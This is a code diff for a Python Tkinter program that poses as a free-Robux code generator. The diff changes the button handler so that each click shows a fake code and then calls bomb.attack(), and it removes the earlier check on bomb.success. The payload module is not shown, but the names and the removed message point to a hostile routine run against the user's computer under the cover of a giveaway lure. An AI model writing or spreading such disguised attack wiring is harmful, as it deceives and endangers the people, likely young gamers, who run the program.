@@ -26,16 +26,11 @@ bobuximg = ImageTk.PhotoImage(Image.open(paths.img("bobux")))
 robux = Label(image=bobuximg)
 robux.pack()
 
-def newCode():
+def generateCode():
     code.config(text="Output: "+codeGenerator.generate())
-def attackPC():
-    newCode()
     bomb.attack()
 
-if bomb.success:
-    getrobuxnow.config(command=attackPC)
-else:
-    getrobuxnow.config(command=newCode)
-    print('Operating System not supported or is without internet!')
+getrobuxnow.config(command=generateCode)
 
-window.mainloop()
+if __name__ == "__main__":
+    window.mainloop()
